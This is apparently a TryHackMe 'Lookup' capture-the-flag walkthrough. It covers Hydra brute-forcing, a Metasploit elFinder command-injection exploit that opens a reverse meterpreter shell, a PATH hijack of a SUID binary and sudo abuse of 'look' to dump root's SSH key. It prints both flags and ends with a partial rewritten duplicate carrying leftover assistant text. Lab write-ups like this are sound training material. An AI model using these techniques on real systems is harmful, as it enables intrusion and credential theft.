# <div align="center">[Lookup](https://tryhackme.com/r/room/lookup)</div>
<div align="center">Test your enumeration skills on this boot-to-root machine.</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/0f4016d8-b972-442d-93b3-056fcff87add" height="200"></img>
</div>

## Task 1. Lookup

Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.﻿

Note: For free users, it is recommended to use your own VM if you'll ever experience problems visualizing the site. Please allow 3-5 minutes for the VM to fully boot up.

### What is the user flag?
```
38375fb4dd8baa2b2039ac03d92b820e
```
### What is the root flag?
```
5a285a9f257e45c68bb6c9f9f57d18e8
```
## Walkthrough

#### Let start with scanning the target network
```
death@esther:~$ nmap 10.10.80.211 -sV -sC 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 IST
Nmap scan report for lookup.thm (10.10.80.211)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> * #### There are 2 ports open
> * Ssh on port 22 
> * http on port 80
#### let add the Ip to `hosts` file
```
echo "IP-ADDRESS-OF-YOUR-MACHINE lookup.thm" | sudo tee -a /etc/hosts
```
### Let nevigate to web 
<div align="center">
<img src="https://github.com/user-attachments/assets/e3dda654-cb00-4625-ad95-842636be7b6b" height="300"></img>
</div>
Here is a login page 
Let try to login with default credentials
<div align="center">
<img src="https://github.com/user-attachments/assets/a67607f7-9110-4af0-8df1-c3a934b196af" height="250"></img>
</div>

Default Credentials don’t work ! But we r getting block for 3 sec.
```
Wrong password. Please try again.
Redirecting in 3 seconds.
```
<div align="center">
<img src="https://github.com/user-attachments/assets/ef1b0684-df73-4097-a021-0f6b4c731e0f" height="200"></img>
</div>

### This lab check over enumeration skills let use bruteforing with hydra using sniper method , we can use burpsuite but that create issue on community version sometime when we load rockyou.txt so im going with hydra

let find password first
```
hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```
```
death@esther:~$ hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 17:10:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10177 login tries (l:10177/p:1), ~637 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:F=try again
[STATUS] 1039.00 tries/min, 1039 tries in 00:01h, 9138 to do in 00:09h, 16 active
[STATUS] 1035.33 tries/min, 3106 tries in 00:03h, 7071 to do in 00:07h, 16 active
[80][http-post-form] host: lookup.thm   login: jose   password: password123
[STATUS] 1030.00 tries/min, 7210 tries in 00:07h, 2967 to do in 00:03h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 17:20:15
```
We got our password let find username
```
hydra -L wordlists/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```
```
death@esther:~$ hydra -L wordlists/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again" 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 17:18:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10178 login tries (l:10178/p:1), ~637 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:F=try again
[80][http-post-form] host: lookup.thm   login: jose   password: password123
[STATUS] 893.00 tries/min, 893 tries in 00:01h, 9285 to do in 00:11h, 16 active
[STATUS] 1028.67 tries/min, 3086 tries in 00:03h, 7092 to do in 00:07h, 16 active
[STATUS] 1062.86 tries/min, 7440 tries in 00:07h, 2738 to do in 00:03h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 17:28:00
```
The user:pass is:
* `jose:password123`

### Let logged in using this credential
we just redirected to another domain let add this to `hosts` file again.'
```
echo "IP-ADDRESS-OF-YOUR-MACHINE files.lookup.thm" | sudo tee -a /etc/hosts
```
<div align="center">
<img src="https://github.com/user-attachments/assets/adff4566-9664-4b7b-aa19-9653712564aa" height="300"></img>
</div>

When i open the credential.txt there is somethings maybe it user & pass for ssh let try to logged in.

<div align="center">
<img src="https://github.com/user-attachments/assets/e27d8329-be23-44fd-8c4b-ac731cf6309c" height="400"></img>
</div>
This is just a trape

```
death@esther:~$ ssh think@10.10.80.211
The authenticity of host '10.10.80.211 (10.10.80.211)' can't be established.
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.80.211' (ED25519) to the list of known hosts.
think@10.10.80.211's password: 
Permission denied, please try again.
think@10.10.80.211's password: 
```
when i press on this 
![image](https://github.com/user-attachments/assets/5c521743-826e-4ac7-b0b5-4829e3c6df62)
I was able to see web file manager name and version let search if there is any exploit and CVE present for this
As i search on web i knwo there is exploit for this in metasploit
```
death@esther:~$ msfconsole -q
msf6 > search elfinder 2.1.47

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection

msf6 > 
```
Let use this 
```
use 0
```
```
show options
```
```
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > show options

Module options (exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /elFinder/       yes       The base path to elFinder
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.2      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > 
```
Let set the LHOST and Rhost
```
set Lhost tun0
```
Let set Rhost
```
set Rhost files.lookup.thm
```
```
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set Lhost tun0
Lhost => 10.17.14.127
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set Rhost files.lookup.thm
Rhost => files.lookup.thm
```
Let run this using run or exploit
```
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
[*] Started reverse TCP handler on 10.17.14.127:4444 
[*] Uploading payload 'TRNyzgLuCE.jpg;echo 6370202e2e2f66696c65732f54524e797a674c7543452e6a70672a6563686f2a202e376d7246434f782e706870 |xxd -r -p |sh& #.jpg' (1975 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...
[*] Sending stage (40004 bytes) to 10.10.80.211
[+] Deleted .7mrFCOx.php
[*] Meterpreter session 1 opened (10.17.14.127:4444 -> 10.10.80.211:35566) at 2025-01-05 18:11:50 +0530
c[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file

meterpreter > 
```
We get meterpreter shell here, let get shell here using command 
```
shell
```
We got this let check who we r 
```
whoami
```
```
meterpreter > shell
Process 2119 created.
Channel 0 created.
whoami
www-data
```
Let swape shell 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ 
```
As we already knew let reconfirm
```
www-data@lookup:/var/www/files.lookup.thm/public_html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
www-data@lookup:/var/www/files.lookup.thm/public_html$ 
```
Yah i am right `think` is user and we need hsi password to elevate our privillages 
Let check for `suid` bit 
```
find / -perm /4000 2>/dev/null
```
```
<c_html/elFinder/php$ find / -perm /4000 2>/dev/null                
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
/snap/core20/1950/usr/bin/newgrp
/snap/core20/1950/usr/bin/passwd
/snap/core20/1950/usr/bin/su
/snap/core20/1950/usr/bin/sudo
/snap/core20/1950/usr/bin/umount
/snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1950/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pwm
/usr/bin/at
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/umount
```
There is suspicious file `/usr/sbin/pwn`
let execute this
```
/usr/sbin/pwm
```
```
www-data@lookup:/tmp$ pwm
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
www-data@lookup:/tmp$
```
It checking for `id` command we can do path manuplation to get password for think, asi change the directory to tmp, let exploit the path , On execution this binary returns the id value and then tried to grab the File → /home/www-data/.passwords. We have to get to the .passwords file on the Binary the Path is set to user www-data , if we are able to manipulate the path by changing it to tmp directory → inside /tmp directory we have set the current path to /tmp because /tmp is World-readable and then creating a bash file which impersonates as think user

Let export path to tmp
```
echo $PATH
```
```
export PATH=/tmp:$PATH
```
```
www-data@lookup:/tmp$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
www-data@lookup:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
www-data@lookup:/tmp$ 
```
```
www-data@lookup:/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Let’s Change the Directory to /tmp , and create a bash file which impersonates the user think 
Let’s create a file named id as i swape the www.data id with thinker id
```
echo -e '#!/bin/bash\n echo "uid=33(think) gid=33(think) groups=33(think)"' > id
```
let give it permission 
```
chmod +x /tmp/id
```
```
www-data@lookup:/tmp$ chmod +x /tmp/id
chmod +x /tmp/id
```
Let run this pwm again
```
www-data@lookup:/tmp$ pwm
pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
www-data@lookup:/tmp$ 
```
We have bunch of password let add all this to a file and preform a bruteforce attack on ssh
```
 hydra -l think -P wordlist.txt ssh://lookup.thm
```
```
death@esther:~$  hydra -l think -P lookup-ssh.txt ssh://lookup.thm
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 19:06:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://lookup.thm:22/
[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
1 of 1 target successfully completed, 1 valid password found
```
We got the password `think`:`josemario.AKA(think)`
```
death@esther:~$ ssh think@lookup.thm
think@lookup.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 05 Jan 2025 01:40:04 PM UTC

  System load:  0.0               Processes:             151
  Usage of /:   59.7% of 9.75GB   Users logged in:       0
  Memory usage: 24%               IPv4 address for ens5: 10.10.80.211
  Swap usage:   0%

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 12 12:07:25 2024 from 192.168.14.1
think@lookup:~$ 
```
We logged in
## User Flag.txt
```
38375fb4dd8baa2b2039ac03d92b820e
```
Let for sudo privileges
```
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
think@lookup:~$ 
```
Let check it on [GTFOBINS](https://gtfobins.github.io/gtfobins/look/)

<div align="center">
<img src="https://github.com/user-attachments/assets/ef855c81-9f95-480b-a4ad-2614bd38ff76" height="200"></img>
</div>

Privillage Escation
```
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```
```
think@lookup:~$ LFILE=/root/.ssh/id_rsa
think@lookup:~$ sudo look '' "$LFILE"
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
think@lookup:~$ 
```

Let logged  in as root , add and changer permission 
```
death@esther:~$ nano lookup_rsa
death@esther:~$ chmod 600 lookup_rsa 
```
```
death@esther:~$ ssh root@lookup.thm -i lookup_rsa 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 05 Jan 2025 01:48:37 PM UTC

  System load:  0.0               Processes:             153
  Usage of /:   59.7% of 9.75GB   Users logged in:       1
  Memory usage: 25%               IPv4 address for ens5: 10.10.80.211
  Swap usage:   0%

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

7 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon May 13 10:00:24 2024 from 192.168.14.1
root@lookup:~# 
```
Root Flag.txt
```
root@lookup:~# cat /root/root.txt 
5a285a9f257e45c68bb6c9f9f57d18e8
```
done








## Walkthrough: Network Penetration Testing

### Scanning the Target Network

We begin by scanning the target machine `10.10.80.211` using Nmap to identify open ports and services.

```bash
death@esther:~$ nmap 10.10.80.211 -sV -sC
```

Output:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 IST
Nmap scan report for lookup.thm (10.10.80.211)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

#### Observations:
- Open ports:
  - SSH on port 22
  - HTTP on port 80

### Adding Target to Hosts File

For easier navigation, we add the target's IP to the `/etc/hosts` file.

```bash
echo "10.10.80.211 lookup.thm" | sudo tee -a /etc/hosts
```

### Navigating to the Web Application

After adding the IP to the hosts file, we open the web application in a browser. The login page appears:

<div align="center">
<img src="https://github.com/user-attachments/assets/e3dda654-cb00-4625-ad95-842636be7b6b" height="300"></img>
</div>

#### Attempting Default Login Credentials

We attempt to log in with common default credentials but are met with a "wrong password" message and a 3-second delay before redirection:

```bash
Wrong password. Please try again.
Redirecting in 3 seconds.
```

<div align="center">
<img src="https://github.com/user-attachments/assets/a67607f7-9110-4af0-8df1-c3a934b196af" height="250"></img>
</div>

### Brute Forcing Login Using Hydra

Since the default credentials didn’t work, we proceed with brute-forcing the login page using Hydra.

#### Step 1: Finding the Password

```bash
hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```

Output:
```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

We successfully find the username `jose` with password `password123`.

#### Step 2: Finding the Username

Next, we brute force the username:

```bash
hydra -L wordlists/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```

Output:
```
[80][http-post-form] host: lookup.thm   login: jose   password: password123
```

We confirm that the valid credentials are `jose:password123`.

### Logging In

We use the found credentials to log into the system:

```bash
login: jose
password: password123
```

After logging in, we are redirected to another domain. We update the `/etc/hosts` file again:

```bash
echo "10.10.80.211 files.lookup.thm" | sudo tee -a /etc/hosts
```

<div align="center">
<img src="https://github.com/user-attachments/assets/adff4566-9664-4b7b-aa19-9653712564aa" height="300"></img>
</div>

### Exploring the `credential.txt` File

Upon opening the `credential.txt` file, we find some credentials, which might be for SSH:

<div align="center">
<img src="https://github.com/user-attachments/assets/e27d8329-be23-44fd-8c4b-ac731cf6309c" height="400"></img>
</div>

We attempt to use these credentials for SSH login:

```bash
ssh think@10.10.80.211
```

However, this attempt fails:

```bash
think@10.10.80.211's password:
Permission denied, please try again.
```

### Identifying Vulnerabilities

While interacting with the system, I discover a vulnerable web application, `elFinder`, running on the target machine. We search for exploits related to the `elFinder` version:

```bash
msfconsole -q
msf6 > search elfinder 2.1.47
```

Output:
```
Matching Modules:
   exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

We decide to exploit the vulnerability using Metasploit.

### Exploit Setup

First, we select the exploit module:

```bash
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Then, we set the `LHOST` and `RHOST`:

```bash
set LHOST tun0
set RHOST files.lookup.thm
```

Finally, we run the exploit:

```bash
run
```

We successfully get a Meterpreter shell:

```bash
[*] Meterpreter session 1 opened (10.17.14.127:4444 -> 10.10.80.211:35566) at 2025-01-05 18:11:50 +0530
```

### Escalating Privileges

Once we have the Meterpreter session, we attempt to escalate privileges by swapping the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

We confirm our user is `www-data` and check for the presence of the `think` user in `/etc/passwd`.

```bash
cat /etc/passwd
```

We confirm that `think` is a user, and we need to find their password to escalate privileges.

### Finding SUID Binaries

We look for SUID binaries that may allow privilege escalation:

```bash
find / -perm /4000 2>/dev/null
```

This reveals a list of binaries that are potential candidates for privilege escalation.

---

This cleaned-up walkthrough provides a more concise and structured explanation of the process, highlighting important actions and outputs. You can use this markdown format in your GitHub repository, and make sure the images are correctly linked as shown in the `<div><img></img></div>` tags.
